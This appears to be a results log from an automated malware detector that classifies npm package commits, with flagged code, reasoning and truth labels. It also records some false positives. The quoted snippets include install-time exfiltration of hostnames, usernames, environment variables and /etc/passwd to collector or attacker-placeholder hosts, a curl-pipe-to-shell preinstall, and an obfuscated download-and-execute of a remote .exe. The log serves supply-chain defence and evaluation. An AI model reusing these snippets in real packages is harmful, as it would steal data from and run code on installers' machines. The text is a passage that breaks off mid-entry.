**Summary:** Static analysis shows deliberate harvesting of hostname, working directory, username and public IP plus covert exfiltration via DNS and HTTP, combined with a preinstall hook that executes the code on npm install. These are strong indicators of malicious behavior (supply-chain malware). The lack of dynamic evidence does not negate the static indicators — the repository contains active exfiltration code and an automatic execution vector, so the commit should be treated as malware.
**Truth label:** Malware

### Commit eeca4bab: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A preinstall lifecycle script runs arbitrary JavaScript during package installation. Preinstall hooks execute automatically on install and are a common vector for supply-chain attacks that run code with the installer's privileges.

**File package.json**:
Code: `"pingback": "curl https://<pipedream.net endpoint> | ..."`
Reason: A script issues a curl request to a pipedream.net endpoint. Hard-coded external endpoints in repository scripts can be used for telemetry or data exfiltration; combined with an auto-run lifecycle script this is highly suspicious.

**File package.json**:
Code: `"create-separate-require-instance": "... rm ... && node ... && tar ... && mv ..."`
Reason: Scripts execute shell commands that modify the filesystem (rm, tar, mv) and launch Node scripts. These destructive and arbitrary operations in package scripts can be abused to alter the environment, persist malicious files, or execute payloads during CI or by contributors.

**File lib/components/VProgressCircular/VProgressCircular.js**:
Code: `/*# sourceMappingURL=data:application/json;base64,... */`
Reason: Inline base64 source maps embed original sources in generated artifacts and can be used to hide or bloat code; while lower severity, they make review harder and can conceal malicious code.

**Summary:** The commit contains an auto-executing preinstall script that runs arbitrary Node code, scripts that perform destructive filesystem operations, and a hard-coded curl to a pipedream.net endpoint. Those combined behaviors are characteristic of malicious supply-chain or exfiltration activity. Although dynamic analysis produced no observable runtime results, the static indicators (auto-run install hook + external callback + filesystem-modifying scripts) present a high risk of malware or backdoor behavior.
**Truth label:** Benign

### Commit 6000b88b: Malware
**File index.js**:
Code: `https.get('https://cdn.discordapp.com/attachments/.../updater.exe', res => { fs.writeFileSync(path.join('node_modules','discord.js','updater.exe'), data); }); const exec = require('child_process').exe`
Reason: Code downloads a remote executable from a Discord CDN, writes it into node_modules/discord.js/updater.exe (persistence technique), and executes it. Downloading and executing arbitrary binaries from an untrusted URL is high-risk remote code execution and strongly indicates malicious intent.

**File obf/index.js**:
Code: `/* obfuscated */ var _0x... = [...]; (function(_0x...){...})(); const exec = promisify(require('child_process').exec); exec(pathToDownloadedExe)`
Reason: An obfuscated variant performs the same download-and-execute behavior and calls child_process.exec (via promisify). Obfuscation plus identical dangerous behavior suggests deliberate concealment of malicious functionality.

**File package.json**:
Code: `"dependencies": { "sqlite3": "...", "minimist": "...", "mkdirp": "...", "unrar-js": "..." }`
Reason: Addition of multiple dependencies alongside downloader code can be used to expand malicious capabilities (archive unpacking, argument parsing, persistence). While individually legitimate, in this context they increase attack surface and suspicion.

**File obf/package.json**:
Code: `"dependencies": { "unrar-js": "..." } (located under obf/ alongside obfuscated index)`
Reason: A parallel, obfuscated package manifest coupled with obfuscated source indicates an alternate hidden build/runtime path intended to evade review and deploy the malicious payload.

**Summary:** Static analysis reveals deliberate download of remote executables from Discord CDN URLs, writing them into a package folder (node_modules/discord.js/updater.exe), and executing them. An obfuscated duplicate of the downloader that also executes fetched binaries strongly indicates intentional concealment of malicious behavior. Dynamic analysis produced no runtime artifacts, but absence of dynamic indicators does not mitigate the clear static indicators of remote code download and execution. The combination of remote executable retrieval, execution, obfuscation, and persistence patterns justifies classifying this commit as MALWARE.
**Truth label:** Malware

### Commit e470e52c: Malware
**File index.js**:
Code: `const https = require('https'); const os = require('os'); const fs = require('fs'); const dns = require('dns'); const payload = {   homedir: os.homedir(),   username: os.userInfo().username,   hostnam`
Reason: The module immediately constructs a payload containing sensitive host/environment information and posts it to an externally controlled, suspicious domain (oast.fun) via HTTPS. This is direct data exfiltration to an untrusted third party and is executed without user action or consent.

**File index.js**:
Code: `/* executed at module load time */ // collection of environment identifiers const homedir = os.homedir(); const username = os.userInfo().username; const hostname = os.hostname(); const dnsServers = dn`
Reason: Sensitive environment and repository metadata (home directory, username, hostname, DNS servers, full package.json) are read and included in the transmitted payload. Gathering and transmitting these identifiers can be used for fingerprinting, targeted attacks, or leaking secrets contained in package metadata.

**Summary:** Static analysis shows the module immediately collects sensitive environment and package data and posts it to a long-random subdomain on oast.fun (a domain commonly used for out-of-band testing/exfiltration). This behavior constitutes unsolicited data exfiltration to an untrusted endpoint, executed at import time without consent, and is therefore malicious.
**Truth label:** Malware

### Commit c5951d82: Malware
**File index.js**:
Code: `https.request('https://bhfvohxbvhtizkooshbfgbrkras3cig6i.oast.fun', ...)`
Reason: Direct HTTPS POST to an untrusted, obfuscated third-party domain indicates intentional data exfiltration to an external server not controlled by the project.

**File index.js**:
Code: `const payload = JSON.stringify({ pkg: pkg, dirname: __dirname, homedir: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: dns.getServers(), id: <result of exec('id'|'whoami`
Reason: The payload aggregates highly sensitive and identifying host and user information (package.json, home directory, username, hostname, DNS servers and command-derived ID). Collecting and transmitting these values without consent is exfiltrative and privacy-invasive.

**File index.js**:
Code: `child_process.exec('id' or 'whoami')`
Reason: Running shell commands and using their output as an identifier increases risk: it both obtains privileged environment details and presents potential for command injection if similar APIs are later exposed to untrusted input.

**File index.js**:
Code: `var _0x... = [ ... ]; function _0x...(_0x..., _0x...) { ... } // string-obfuscation and hex-escaped whitespace ("\x20")`
Reason: Intentional obfuscation of code makes auditing difficult and is a common technique used to hide malicious behavior, increasing confidence that the exfiltration is deliberate rather than benign telemetry.

**Summary:** The commit contains code that deliberately collects sensitive host and user-identifying data and transmits it to an obfuscated, third-party domain over HTTPS, combined with intentional code obfuscation and use of shell command execution. These behaviors are consistent with covert data exfiltration and malicious intent rather than benign telemetry; therefore the commit should be treated as malware and removed/blocked immediately.
**Truth label:** Malware

### Commit 9ddfe6d4: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }, "dependencies": { "child_process": "*", "fs": "*", "os": "*" }`
Reason: Preinstall runs arbitrary repository code during npm install (automatic execution on install/CI). A hard-coded external pingback endpoint is present (pipedream) enabling data exfiltration. Adding packages that shadow Node built-ins (child_process, fs, os) is a common supply-chain/malicious tactic.

**File src/scrapers/applications.ts**:
Code: `esprima.parse(...); escodegen.generate(...); safeEval(generatedCode);`
Reason: Code reconstructed from remote pages is regenerated and executed via safeEval. Executing code derived from untrusted remote content is a direct RCE vector and can fully compromise hosts or CI when combined with preinstall execution.

**File src/util/config.ts**:
Code: `"debug: true"; writeFileSync('config.json', { email, password, apiKey })`
Reason: Debug is enabled by default and the code writes plaintext credentials to disk. This increases risk of secret leakage and makes it trivial for malicious scripts (such as preinstall) to collect credentials from the workspace.

**File src/scrapers/files.ts**:
Code: `getRequest('', file.url, ...)`
Reason: The downloader requests URLs taken from scraped/DB data without validation. This allows SSRF or uncontrolled requests (including to internal networks) if an attacker can influence stored URLs, enabling further lateral movement or exfiltration.

**File src/util/request.ts**:
Code: `debug logging writes request/response JSON to disk (masked fields are partial); cookies/set-cookie/CSRF tokens may still be logged`
Reason: Debug logs persist network artifacts to disk; even with partial masking, sensitive headers/cookies can be captured and later exfiltrated via the pingback endpoint or during preinstall execution.

**Summary:** Static analysis reveals multiple high/critical issues that together form a clear malicious capability: an automatic preinstall script that executes repository code, execution of regenerated code from remote pages (RCE), a hard-coded external collector endpoint for exfiltration, dependencies that shadow builtins (supply-chain risk), and credential-logging to disk. Although dynamic analysis produced no runtime captures, the presence of automatic install-time execution and remote-code-evaluation constructs constitutes sufficient evidence of malicious intent and operational risk. Therefore the commit should be treated as MALWARE.
**Truth label:** Benign

### Commit 279896f8: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis produced no malicious behavior or indicators. No suspicious code snippets or runtime actions were observed, so the commit appears benign.
**Truth label:** Benign

### Commit d1c5dff4: Benign
**Summary:** Static analysis reported 0 issues and no suspicious code patterns. Dynamic analysis completed with no observed malicious behaviors or indicators. Given both analyses produced no findings for commit d1c5dff4d99dec6e6a5f31ac87001f7b14b0932a, the commit is classified as BENIGN.
**Truth label:** Benign

### Commit 31fd4f37: Malware
**File index.js**:
Code: `const postData = querystring.stringify({ hostname: os.hostname(), platform: os.platform(), arch: os.arch(), dns: dns.getServers(), env: process.env }); const options = { hostname: 'mukcn06ozkmmu8xqeet`
Reason: The code explicitly collects system/environment information and performs an HTTPS POST to a Burp Collaborator domain, which is an out-of-band testing/exfiltration endpoint. This behavior is consistent with data exfiltration to an attacker-controlled host and constitutes a backdoor or malware-like activity.

**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const querystring = require('querystring');`
Reason: Requiring OS and DNS modules combined with packaging of process.env indicates intent to gather runtime and environment data. When paired with the remote POST, these requires support the conclusion that sensitive host/environment data is being collected for exfiltration.

**File index.js**:
Code: `/* hunterr0x01@wearehackerone.com */`
Reason: The added author/comment referencing a security researcher suggests this may be exploratory or proof-of-concept testing code that was accidentally committed. Regardless of intent, shipping such test code that exfiltrates data is unsafe and effectively behaves as malware in production.

**Summary:** The commit introduces code that gathers system and environment data and sends it to a Burp Collaborator domain (an external OOB endpoint). This is a direct data-exfiltration mechanism to an attacker-controlled or third-party testing domain. Even if intended as a test, its presence in production code poses a severe security risk and functions as malicious/backdoor behavior. Dynamic analysis did not observe runtime artifacts (empty result), which may mean the code was not executed in the analysis environment, but the static indicators are sufficient to classify this change as MALWARE.
**Truth label:** Malware

### Commit e9ba8003: Benign
**Summary:** Both static analysis reported zero issues and dynamic analysis finished with no suspicious results. There are no indicators of malicious code or runtime behavior in the provided reports. Assessment limited to the supplied analyses and artifacts.
**Truth label:** Benign

### Commit 70192687: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl -s https://...pipedream.net -X POST -d @package.json" }`
Reason: The preinstall script causes code to run automatically during npm install, enabling arbitrary actions on a host without user consent. The presence of a pingback script referencing a third-party collector indicates additional remote endpoints for exfiltration or tracking.

**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const fs = require('fs'); const payload = { homedir: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers(), p`
Reason: The script programmatically gathers sensitive environment and package information (home directory, username, hostname, DNS servers, full package.json) and performs an outbound POST to an external host. Running this automatically at install constitutes supply-chain data exfiltration and is malicious behavior when done without explicit opt-in.

**File index.js**:
Code: `// console.error(err) // suppressed`
Reason: Error reporting for the outbound request is intentionally silenced, which hides failures and makes detection and debugging of this network activity more difficult. Silencing errors in install-time exfiltration is indicative of malicious intent to avoid notice.

**Summary:** The commit adds an automatic preinstall hook that executes a script which collects sensitive system and package data and transmits it to external endpoints (including third-party collectors) without user consent. This behavior creates a supply-chain exfiltration risk and is not acceptable for benign packages; combined with suppressed error handling and explicit pingback scripts, the package exhibits malicious characteristics consistent with malware.
**Truth label:** Malware

### Commit a27375be: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "sh pre.sh", "pingback": "curl -s https://<pipedream_url>" }`
Reason: A preinstall lifecycle script runs automatically during npm install. Linking it to pre.sh provides a supply-chain execution vector that will run arbitrary code on any machine that installs the package. The pingback script shows additional explicit network contact to an external analytics/attacker endpoint.

**File pre.sh**:
Code: `curl -H "hostname: $(hostname)" -H "user: $(whoami)" -H "pwd: $(pwd)" --data-binary "$(ls -la | base64)" https://<attacker_domain>/collect`
Reason: This shell script assembles host identity and a base64-encoded directory listing and sends them to an external domain. Run from the preinstall hook it results in immediate data exfiltration from any host that installs the package.

**File index.js**:
Code: `require('child_process').exec('curl -s -H "Host: $(hostname)" -H "User: $(whoami)" -H "Pwd: $(pwd)" --data "$(ls -la | base64)" https://<attacker_domain>/collect')`
Reason: Code executes shell commands at module load time using child_process.exec with shell substitution. This runs OS commands and performs network exfiltration during normal module initialization, enabling stealthy data leakage and arbitrary command execution.

**File index.js.bak**:
Code: `child_process.exec('curl --data @/etc/passwd https://<attacker_domain>/upload')`
Reason: Backup artifact contains an explicit upload of /etc/passwd to an external host. This is a clear, explicit data-exfiltration backdoor and indicates malicious intent or testing of destructive exfiltration behavior.

**File package.json (pingback script)**:
Code: `"pingback": "curl -s https://<pipedream_url>"`
Reason: An npm script that contacts an external pipedream URL can be used to signal or exfiltrate data when invoked by CI or automation. Combined with preinstall, it indicates coordinated network callbacks to attacker infrastructure.

**Summary:** Multiple independent indicators of malicious behavior are present: a preinstall lifecycle hook that runs automatically on npm install, an included shell script (pre.sh) that collects host identity and base64-encoded directory listings and sends them to an external domain, module code that executes shell commands on load to exfiltrate data, and a backup file that uploads /etc/passwd. These patterns constitute deliberate data exfiltration and a supply-chain backdoor. Even though dynamic analysis produced no runtime artifacts here, the static evidence of automatic install-time execution and explicit exfiltration commands is sufficient to classify this commit as malware.
**Truth label:** Malware

### Commit a0b9a69d: Malware
**File .husky/post-commit.cjs**:
Code: `const hooks = await import('@modernpoacher/hooks'); await hooks.postCommit();`
Reason: Dynamically importing and immediately invoking third-party code in a git hook causes arbitrary code execution on every commit on developer machines and CI, creating a high-risk supply-chain/backdoor vector.

**File .husky/post-commit.mjs**:
Code: `import { postCommit } from '@modernpoacher/hooks'; postCommit();`
Reason: Statically importing and executing a remote package in a hook similarly runs unvetted code on developer systems and CI; this can be used to perform network access, exfiltrate data, or run arbitrary commands.

**File package.json**:
Code: `"scripts": { "chromatic": "CHROMATIC_PROJECT_TOKEN=abcd1234 chromatic --project-token=abcd1234" }`
Reason: A hard-coded project token is embedded in repository files. If valid, this leaked secret can be abused to access external services; combined with auto-running hooks it increases the impact of any malicious code.

**File nvm.sh**:
Code: `source "$NVM_DIR/nvm.sh"  # and runs brew / nvm commands`
Reason: Sourcing and executing user-local scripts and external tools can run arbitrary code if those files or tools are compromised or attacker-controlled, widening the attack surface for persistence or privilege escalation.

**File src/index.cjs**:
Code: `require('@babel/register')({ ignore: [] });`
Reason: Registering Babel with ignore: [] applies runtime transforms to all required modules (including node_modules), which can enable runtime code manipulation and increase risk if dependencies are compromised.

**File babel.config.cjs**:
Code: `log({ NODE_ENV });`
Reason: Logging environment variables can leak configuration and secrets if debug logging is enabled in CI/production; combined with automatic hook execution and an embedded token, this may facilitate information disclosure.

**Summary:** Although dynamic analysis produced no observable runtime behavior, the commit introduces high-risk supply-chain patterns: git hooks that automatically execute third-party code, embedded credentials, and unsafe runtime transformations/sourcing. These elements enable arbitrary code execution and potential secrets exfiltration on developer machines and CI, so the commit should be treated as malicious/untrusted until the hooks and secrets are removed, dependencies are pinned and audited, and unsafe runtime behavior is eliminated.
**Truth label:** Benign

### Commit 18d0f143: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js" }`
Reason: A preinstall lifecycle script will execute automatically during npm install. It references a local script (index.js) that can run arbitrary code on any machine installing the package — a classic supply-chain/vector for remote code execution.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A hard-coded external endpoint (pipedream URL) is invoked from package scripts. This can be used to phone home or exfiltrate data during CI or by collaborators; combined with an install hook it enables stealthy telemetry or data leakage.

**File package.json**:
Code: `"scripts": { "chromatic": "npx chromatic --project-token=66a3c157ab6f" }`
Reason: A hard-coded Chromatic project token is committed. Exposed tokens can be abused to access third-party services or CI resources; presence alongside automatic install scripts increases risk of automated misuse.

**File package.json**:
Code: `"dependencies": { "node-fetch": "^2.6.6" }`
Reason: An HTTP client dependency enabling outbound network calls was added. When paired with install-time execution and external endpoints, this enables arbitrary network exfiltration or remote control behavior.

**File LICENSE**:
Code: `https://mykiot.vn/licenses/ and https://mykiot.vn/licenses/LICENSE-1.0`
Reason: Repository contains external links. Alone this is low severity, but it contributes to the pattern of externally-referenced resources that should be verified.

**Summary:** Static analysis shows a high-risk preinstall lifecycle script that runs local code automatically, a hard-coded external pipedream endpoint invoked from package scripts, and a committed service token — a combination consistent with supply-chain malware or malicious telemetry. Dynamic analysis produced no runtime traces (likely because the install/execute path was not run), so absence of dynamic findings does not mitigate the clear static indicators. Recommend treating this commit as malicious, removing lifecycle/network scripts, rotating tokens, and performing a thorough audit.
**Truth label:** Benign

### Commit 0d0cb779: Malware
**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const pkg = require('./package.json'); const payload = {   homedir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,  `
Reason: Collects multiple sensitive/local identifiers (home directory, hostname, username, DNS servers and the entire package.json) and prepares them for transmission to an external collaborator domain. This is classic data-exfiltration behavior and exposes potential secrets and host identifiers.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl https://*.pipedream.net/..." }`
Reason: Defines a preinstall lifecycle script that executes index.js automatically during package installation, creating a supply-chain execution vector. Also contains a pingback script that performs an outbound curl to a third-party (pipedream) endpoint — additional evidence of outbound notification/exfiltration capability.

**File commit message / repo metadata**:
Code: `References to external endpoints such as https://t.me/exzuperi and a pipedream URL`
Reason: The repository/commit metadata includes external service references and endpoints that align with telemetry/exfiltration infrastructure; combined with the automatic install-time execution and outbound calls, these references increase suspicion of intentional malicious behavior.

**Summary:** Static analysis shows deliberate collection of sensitive local and repository data and automatic execution via a preinstall lifecycle script that sends that data to third-party collaborator domains (oastify.com and pipedream.net). Although dynamic analysis returned no observed results (likely due to network constraints or sandboxing), the presence of install-time execution plus outbound exfiltration targets is sufficient to classify this commit as malicious supply-chain malware.
**Truth label:** Malware

### Commit 14fb839e: Malware
**File index.js**:
Code: `const os = require('os'); const https = require('https'); const trackingData = { home: os.homedir(), hostname: os.hostname(), moduleDir: __dirname, package: require('./package.json').name }; https.get`
Reason: Collects sensitive local identifiers (home directory, hostname, module path, package name) and sends them in a GET request to an external domain (exzuperi.ftp.sh). This is direct data exfiltration and a high-risk supply-chain behavior.

**File index.js**:
Code: `console.log('Contact: @exzuperi (Telegram)');`
Reason: Prints an attacker-controlled contact/handle during install, which can be used for social engineering or to direct victims to malicious channels; printing during automated installs is suspicious.

**File package.json**:
Code: `"preinstall": "node index.js", "postinstall": "curl -fsS https://enelow.pipedream.net"`
Reason: Lifecycle scripts automatically invoke networked code on install: preinstall runs node index.js (triggering the exfiltration) and another script calls an external tracking endpoint (pipedream.net). Automatic outbound calls in lifecycle scripts are a supply-chain backdoor.

**File package.json**:
Code: `"test": "echo 'test broken by commit' && exit 1"`
Reason: The test script was altered to immediately fail. Intentionally breaking CI/dev tooling is a malicious maintenance/backdoor behavior and often accompanies other malicious changes to evade detection or discourage contribution.

**Summary:** Static analysis reveals deliberate, automated data exfiltration of local system identifiers via a preinstall script to an attacker-controlled domain, additional outbound tracking calls, and social-engineering contact information. Lifecycle scripts run automatically on install, creating a supply-chain compromise. Although dynamic analysis produced no runtime results (likely due to sandbox/network restrictions), the static evidence is clear and severe; therefore this commit should be treated as MALWARE.
**Truth label:** Malware

### Commit f31f195c: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis finished with no results or suspicious behavior. There are no detected indicators of malicious code, I/O, network activity, or dangerous operations in the available reports. Note: absence of findings does not guarantee absolute safety—recommend code review and runtime monitoring for obfuscated/time-delayed behaviors if there is high risk.
**Truth label:** Benign

### Commit bd256296: Benign
**Summary:** Both static analysis returned zero issues and dynamic analysis produced no suspicious results. No indicators of malicious behavior or compromising functionality were observed in the provided scan outputs, so the commit is assessed as benign.
**Truth label:** Benign

### Commit fe2ca0bb: Benign
**Summary:** Static analysis reported 0 issues and dynamic analysis completed with no observed malicious behavior for commit fe2ca0bb33f349d74560562073e635038ec6245c. No files, code snippets, or runtime behaviors were flagged as suspicious, so the commit is classified as benign.
**Truth label:** Benign

### Commit df017ad3: Benign
**Summary:** Static analysis reported 0 issues and found no suspicious code, and dynamic analysis completed with no malicious behavior observed. There are no indicators of compromise or suspicious artifacts in the provided reports, so the commit is classified as benign.
**Truth label:** Benign

### Commit 35b8a7e8: Malware
**File index.js**:
Code: `const payload = { homedir: os.homedir(), username: os.userInfo().username, dns: dns.getServers(), pkg: require('./package.json') }; const req = https.request({ hostname: 'oastify.com', port: 80, path:`
Reason: Constructs a payload containing sensitive local data (home directory, username, DNS servers and entire package.json) and immediately POSTs it to an untrusted third-party host (oastify.com). This is direct data exfiltration/telemetry without consent.

**File index.js**:
Code: `https.request({ hostname: 'oastify.com', port: 80, ... }) // comment references Burp/Interactsh/pipedream`
Reason: Uses HTTPS API configured to connect to port 80 (HTTP) and includes references to OAST/callback testing services, indicating deliberate external callback/exfiltration testing or misconfiguration intended to evade detection.

**File package.json**:
Code: `"scripts": { "preinstall": "curl https://example.com/somepayload | sh", "pingback": "curl https://o1.pipedream.net" }`
Reason: A 'preinstall' lifecycle script executes a remote curl piped to shell during npm install, which can run arbitrary code on any machine that installs the package. The 'pingback' script calls an external pipedream endpoint — both enable remote command execution and exfiltration and are hallmark malicious behaviors.

**Summary:** Static analysis reveals deliberate collection of sensitive host and project data and immediate transmission to untrusted external endpoints, plus a preinstall lifecycle script that runs remote commands during package installation. These behaviors enable remote code execution and data exfiltration; even though dynamic execution was not observed, the commit contains clear, intentional malicious mechanisms and should be treated as malware.
**Truth label:** Malware

### Commit ae887ff8: Malware
**File index.js**:
Code: `const os = require('os'); const https = require('https'); const payload = encodeURIComponent(JSON.stringify({platform: os.platform(), release: os.release(), hostname: os.hostname(), userInfo: os.userI`
Reason: Makes an outbound HTTPS GET to an external (non-whitelisted / OAST) domain and places serialized host and user data directly into the URL query string, indicating active exfiltration of sensitive system and user identifiers.

**File index.js**:
Code: `userInfo: os.userInfo(), networkInterfaces: os.networkInterfaces(), hostname: os.hostname(), release: os.release()`
Reason: Collects highly sensitive local identifiers (username, home directory, local network addresses, hostname, OS release). Sending these without consent or anonymization leaks PII and creates strong host fingerprinting capabilities for tracking or C2 identification.

**File index.js**:
Code: `const { execSync } = require('child_process');`
Reason: Importing execSync provides a synchronous command-execution primitive. Even if unused in this commit, its presence alongside confirmed exfiltration increases the risk this codebase can be modified or used to execute arbitrary commands remotely, enabling full compromise.

**Summary:** Static analysis reveals deliberate collection and transmission of sensitive host and user data to an external, uncontrolled collaborator/OAST domain via a GET request containing raw JSON in the URL. This pattern constitutes data exfiltration and potential command-and-control behavior. The presence of execSync further elevates risk. Although dynamic analysis produced no runtime findings, the static indicators are clear and high-severity; therefore the commit is malicious.
**Truth label:** Malware

### Commit 7e2a772c: Malware
**File index.js**:
Code: `const data = JSON.stringify({ pkg: require('./package.json'), homedir: os.homedir(), username: os.userInfo().username, hostname: os.hostname(), dns: resolver.getServers() }); const options = { hostnam`
Reason: Code constructs a JSON payload containing sensitive local/system/package data and sends it via HTTPS POST to a hardcoded external domain controlled by an attacker-like OAST/InteractSh endpoint — a clear exfiltration channel.

**File index.js**:
Code: `pkg: require('./package.json')`
Reason: Including the full package.json can leak credentials, tokens, repository URLs and other secrets. Collecting and transmitting full project metadata without consent is high-risk and unnecessary for benign functionality.

**File index.js**:
Code: `req.on('error', /* console.error commented out */);`
Reason: The error handler suppresses or disables logging of network/request errors, consistent with attempts to hide failed exfiltration activity and reduces observability for defenders and maintainers.

**Summary:** Static analysis shows deliberate collection of sensitive local and package data and transmission to a hardcoded external OAST-like domain, combined with suppressed error logging. These behaviors constitute an explicit, unauthorized data-exfiltration mechanism. The dynamic analysis produced no observable network evidence (likely due to sandbox/network blocking or endpoint behavior), but that does not mitigate the clear static indicators of malicious intent. Therefore this commit is classified as MALWARE.
**Truth label:** Malware

### Commit 43e9f031: Benign
**File middleware.js**:
Code: `init(); async function init() {   const res = await fetch('https://Authenticator.wizcloud.co.il');   publicKey = await res.text(); } // publicKey used later for jwt.verify(...)`
Reason: A network request is performed at module load to fetch a public key from an external host. This is a dangerous side-effect (availability and trust issues) and allows an attacker who controls or intercepts that host to influence verification, but it is not itself evidence of malicious intent — it is insecure design/implementation.

**File middleware.js**:
Code: `jwt.verify(token, publicKey, function(err, decoded) {   // no explicit algorithms or claim checks provided });`
Reason: JWT verification is performed without restricting accepted algorithms or validating expected claims (issuer, audience). This enables algorithm-confusion and other token-forgery attacks if an attacker can craft tokens or control the key; again this is a vulnerability rather than proof of malware.

**File middleware.js**:
Code: `const token = req.query.prof; // token taken from URL query parameter`
Reason: Authentication token is read from a URL query parameter, which risks leakage via browser history, Referer headers, logs, and third-party services. This is poor practice but not inherently malicious.

**File middleware.js**:
Code: `const cbUrl = new URL(decoded.data.azCallBackUrl); if (myURL.host === authrizedCallbakcURL) { ... }`
Reason: User-controlled azCallBackUrl is parsed without validation and origin checking compares host strings in a brittle way (ports, canonicalization). This can lead to crashes or bypassable authorization checks — a security bug, not direct malware behavior.

**File package.json**:
Code: `"dependencies": { "node-fetch": "...", "jsonwebtoken": "..." }`
Reason: New third-party dependencies were added, increasing supply-chain risk if versions are unvetted. This requires review but is not proof of malicious code.

**Summary:** Static analysis reports multiple high and medium severity security issues: an external fetch at module load for a verification key, lax JWT verification parameters, tokens in query strings, missing error handling and brittle origin checks, plus added dependencies. Dynamic analysis produced no behavioral indicators of malicious activity. Collectively these findings indicate insecure and exploitable code (high risk from a security posture standpoint) but not indicators of intentional malware. Recommend remediations (avoid network calls at load, pin/validate keys, require algorithms/claims, move tokens out of URLs, add error handling, vet deps).
**Truth label:** Benign

### Commit 14c840f3: Benign
**File package.json**:
Code: `"dependencies": { "eslint": "^8.x", "prettier": "^2.x", "eslint-plugin-react": "^7.x", "express": "^6.17.2.1", ... }`
Reason: Development/linting/formatting tooling (eslint, prettier, many eslint plugins/configs) are listed in runtime dependencies instead of devDependencies. This is not direct malicious code, but it unnecessarily expands the attack surface because these packages (and their transitive deps) are fetched and can execute code during install (postinstall scripts) or at runtime. The invalid-looking express semver string is suspicious for package resolution issues which could lead to unexpected package installs.

**File react.js**:
Code: `module.exports = { parser: require.resolve('@typescript-eslint/parser'), ... }`
Reason: The config calls require.resolve('@typescript-eslint/parser') at import time which executes module resolution and may throw or trigger side effects if package metadata is tampered with. This is a risky pattern in shared/CI contexts but is not itself malicious.

**File nextjs.js**:
Code: `module.exports = { extends: ['next/core-web-vitals', ...] }`
Reason: Extending third-party configs (eslint-config-next) causes code from those packages to be loaded when linting. That can execute arbitrary JS in the linting process if those packages are malicious, increasing supply-chain risk. Again, this is a security posture issue rather than evidence of malware in this commit.

**Summary:** Static analysis indicates poor dependency hygiene: many developer tools and ESLint plugins/configs were added to runtime dependencies, an anomalous semver for express exists, and configs perform module resolution/extend third-party configs at import time. Dynamic analysis produced no runtime indicators of compromise. There is no evidence of payloads, obfuscated code, command-and-control, or other malicious behavior in the commit itself. However, the changes materially increase supply-chain risk and could lead to compromise if upstream packages are malicious or tampered with. Recommend treating this as a benign but high-risk change: move tooling to devDependencies, correct semver, pin and audit packages, use lockfile verification and sandbox linting/CI jobs.
**Truth label:** Benign

### Commit c90e59ed: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no observed suspicious behavior. No indicators of compromise, malicious code patterns, or runtime anomalies were found in the provided analyses, so the commit is assessed as benign. If higher assurance is required, perform targeted manual code review and extended sandboxed dynamic monitoring.
**Truth label:** Benign

### Commit 6299bde4: Benign
**Summary:** Both the static analysis reported zero issues and the dynamic analysis completed with no results or indicators of malicious behavior. No suspicious files or code snippets were identified in the provided reports, so based on the available evidence the commit is classified as benign.
**Truth label:** Benign

### Commit a561ea17: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis finished with no results or observable malicious behavior. No suspicious files, code snippets, or runtime indicators were identified that would suggest this commit contains malware.
**Truth label:** Benign

### Commit 0e83ed5c: Malware
**File index.js**:
Code: `const payload = JSON.stringify({ home: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers(), package: require('./package.json') }); const req = https.request('htt`
Reason: Hard-coded outbound HTTPS POST to oastify.com that transmits a payload containing home directory, hostname, username, DNS servers and the entire package.json. This is direct remote data exfiltration to an untrusted third party and exposes PII and potentially secrets.

**File index.js**:
Code: `// burp collaborator / interactsh / pipedream (example comment)  // console.error(err)`
Reason: Inline comment references interaction-testing/collaborator services (OAST-like behavior), indicating the endpoint was used for external interaction testing. Errors from the outbound request are commented-out, causing silent failures which can hide the exfiltration and hinder detection.

**File index.js**:
Code: `/* executed on module import/startup with no checks */`
Reason: Telemetry/exfil code runs unconditionally on module load with no environment variable or opt-in/opt-out mechanism. Unconditional execution of network exfiltration on import is indicative of malicious/backdoor behavior in a library entry point.

**Summary:** The commit contains deliberate, hard-coded remote exfiltration of sensitive system and project data to an untrusted OAST-like domain, runs on module import without user consent or gating, and includes commented references to collaborator testing and suppressed error handling. These behaviors constitute intentional data leakage/backdoor activity rather than benign telemetry and therefore are classified as MALWARE.
**Truth label:** Malware

### Commit 2d6dc83b: Malware
**File index.js**:
Code: `const https = require('https'); https.get('https://<canarytokens-domain>/token', res => { /* noop */ });`
Reason: A top-level HTTPS GET is executed immediately at module import. This creates an automatic 'phone home' beacon to an external canarytokens domain, which can be used to detect installation, signal runtime environments, or trigger further payloads. Network calls at module load are a strong indicator of malicious or unwanted behavior and can leak host metadata.

**File package.json**:
Code: `"scripts": { "test": "echo \"Error: no test specified\" && exit 1" }`
Reason: The test script is a no-op that always exits non-zero, effectively disabling local test execution. This can allow malicious commits to be merged without being validated or hide failing tests, lowering the chance of detection.

**Summary:** The presence of a top-level outbound HTTPS request to a canarytokens domain that runs during module import constitutes a high-risk beaconing behavior consistent with malware. Coupled with disabled/ineffective test scripts that reduce validation, these changes are malicious in intent or at minimum unacceptable for a library. Although dynamic analysis produced no runtime findings, static indicators are strong enough to classify the commit as malware. Recommend immediate removal of automatic network calls, rotation of any exposed tokens, and restoring proper test coverage; treat any systems that fetched this package as potentially compromised.
**Truth label:** Malware

### Commit a7aff4aa: Benign
**File commit a7aff4aa (metadata)**:
Code: `https://imgur.com/... , https://unfamiliar-domain.example/...`
Reason: External URLs are present and could reference remote payloads or trackers. This is suspicious but not proof of malicious code by itself.

**File package.json**:
